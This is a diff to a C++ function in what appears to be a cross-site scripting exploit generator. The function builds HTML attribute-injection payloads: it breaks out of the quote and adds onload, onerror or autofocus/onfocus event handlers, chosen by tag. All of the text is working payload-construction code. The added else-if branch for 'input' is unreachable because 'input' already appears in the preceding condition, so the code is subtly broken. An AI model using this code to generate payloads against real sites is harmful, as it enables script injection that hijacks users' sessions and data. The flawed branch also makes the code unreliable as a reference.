@@ -410,14 +410,32 @@ std::string Metadata::generate_attribute_exploit_from_scratch() const {
     if (is_initialized() && has_valid_exploit() &&
         (get_exploit_type() == Exploit_Type::Html) &&
         (get_exploit_token() == "attribute")) {
-        // Need to break out of attribute
-        payload += get_exploit_quote_type();
-        // insert event handlers
-        payload += " onload=" + function;
-        payload += " onerror=" + function;
-        // Create new attribute
-        payload += " foo=";
-        payload += get_exploit_quote_type();
+        // only certain tags use onload:
+        if ((get_exploit_tag() == "body")   ||
+            (get_exploit_tag() == "iframe") ||
+            (get_exploit_tag() == "img")    ||
+            (get_exploit_tag() == "input")  ||
+            (get_exploit_tag() == "link")   ||
+            (get_exploit_tag() == "script") ||
+            (get_exploit_tag() == "style")) {
+            // Need to break out of attribute
+            payload += get_exploit_quote_type();
+            // insert event handlers
+            payload += " onload=" + function;
+            payload += " onerror=" + function;
+            // Create new attribute
+            payload += " foo=";
+            payload += get_exploit_quote_type();
+        } else if (get_exploit_tag() == "input") {
+            // Trickery
+            // Need to break out of attribute
+            payload += get_exploit_quote_type();
+            // insert event handlers
+            payload += " onfocus=" + function;
+            // Create new attribute
+            payload += " autofocus foo=";
+            payload += get_exploit_quote_type();
+        }
     }
     return payload;
 }
